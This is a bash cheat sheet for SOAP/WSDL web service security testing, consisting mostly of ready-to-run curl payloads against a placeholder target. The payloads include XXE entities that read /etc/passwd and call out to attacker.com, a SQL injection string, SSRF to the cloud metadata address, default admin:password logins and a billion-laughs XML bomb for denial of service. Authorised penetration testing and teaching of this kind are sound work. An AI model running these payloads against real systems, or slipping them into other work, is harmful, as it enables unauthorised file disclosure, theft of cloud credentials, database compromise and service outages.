#!/bin/bash
# ==============================================
# SOAP/WSDL SECURITY TESTING CHEAT SHEET
# ==============================================

# 1. RECONNAISSANCE
# -----------------

# Discover WSDL Files
curl -s https://target.com/wsdl -o wsdl.xml
curl -s https://target.com?wsdl -o wsdl.xml

# Extract WSDL endpoints
xmllint --xpath "//*[local-name()='address']/@location" wsdl.xml 2>/dev/null | cut -d '"' -f 2

# Parse WSDL with wsdl2html
wsdl2html -o wsdl_report.html wsdl.xml

# 2. MANUAL TESTING
# ----------------

# Basic SOAP Request
curl -X POST -H "Content-Type: text/xml" -d @request.xml https://target.com/soap/api

# Sample request.xml:
# <?xml version="1.0"?>
# <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
# <soap:Body>
# <GetUser xmlns="http://target.com/wsdl">
#   <UserId>1</UserId>
# </GetUser>
# </soap:Body>
# </soap:Envelope>

# 3. INJECTION TESTING
# -------------------

# XML Injection
curl -X POST -H "Content-Type: text/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope><soap:Body><GetUser>&xxe;</GetUser></soap:Body></soap:Envelope>' https://target.com/soap/api

# SQL Injection
curl -X POST -H "Content-Type: text/xml" -d '<?xml version="1.0"?><soap:Envelope><soap:Body><GetUser><UserId>1 OR 1=1</UserId></GetUser></soap:Body></soap:Envelope>' https://target.com/soap/api

# 4. AUTOMATED TOOLS
# -----------------

# WSDL Fuzzing with WSFuzzer
python3 wsfuzzer.py -u https://target.com/wsdl -o wsfuzzer_report.xml

# SOAP API Scanning with SoapUI
soapui -t "TestSuite" -e "https://target.com/wsdl" -r -f soapui_results

# Burp Suite SOAP Scanner
# Configure Burp to intercept SOAP traffic and use Active Scan

# 5. VULNERABILITY CHECKS
# ----------------------

# XXE Testing
curl -X POST -H "Content-Type: text/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]><soap:Envelope><soap:Body><GetUser>&xxe;</GetUser></soap:Body></soap:Envelope>' https://target.com/soap/api

# SSRF Testing
curl -X POST -H "Content-Type: text/xml" -d '<?xml version="1.0"?><soap:Envelope><soap:Body><GetUser><UserId>http://169.254.169.254/latest/meta-data</UserId></GetUser></soap:Body></soap:Envelope>' https://target.com/soap/api

# 6. AUTHENTICATION TESTING
# ------------------------

# Weak Authentication
curl -X POST -H "Content-Type: text/xml" -H "Authorization: Basic YWRtaW46cGFzc3dvcmQ=" -d @request.xml https://target.com/soap/api

# WS-Security Testing
curl -X POST -H "Content-Type: text/xml" -d @wsse_request.xml https://target.com/soap/api

# Sample wsse_request.xml:
# <soap:Envelope xmlns:soap="..." xmlns:wsse="...">
# <soap:Header>
# <wsse:Security>
#   <wsse:UsernameToken>
#     <wsse:Username>admin</wsse:Username>
#     <wsse:Password>password</wsse:Password>
#   </wsse:UsernameToken>
# </wsse:Security>
# </soap:Header>
# <soap:Body>...</soap:Body>
# </soap:Envelope>

# 7. PERFORMANCE TESTING
# ---------------------

# XML Bomb (DoS)
curl -X POST -H "Content-Type: text/xml" -d @xmlbomb.xml https://target.com/soap/api

# Sample xmlbomb.xml:
# <?xml version="1.0"?>
# <!DOCTYPE lolz [
# <!ENTITY lol "lol">
# <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
# <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
# ]>
# <soap:Envelope><soap:Body><GetUser>&lol3;</GetUser></soap:Body></soap:Envelope>

# 8. REPORTING
# -----------

# Generate HTML Report from WSDL
wsdl-viewer -o report.html wsdl.xml

# ==============================================
# TIPS:
# 1. Always check for WSDL files (?wsdl, /wsdl)
# 2. Test both SOAP 1.1 and SOAP 1.2 endpoints
# 3. Look for verbose error messages
# 4. Check for proper input validation
# ==============================================

# RECOMMENDED TOOLS:
# ------------------
# SoapUI (https://www.soapui.org/)
# WSFuzzer (https://github.com/ghostlulzhacks/WSFuzzer)
# wsdl2html (https://github.com/wsdl2html/wsdl2html)
# Burp Suite (https://portswigger.net/burp)
# xmllint - XML parser (usually comes with libxml2)
# curl - Command-line HTTP client

# Common SOAP Endpoints:
# /soap
# /soap/api
# /services
# /ws
# /axis2/services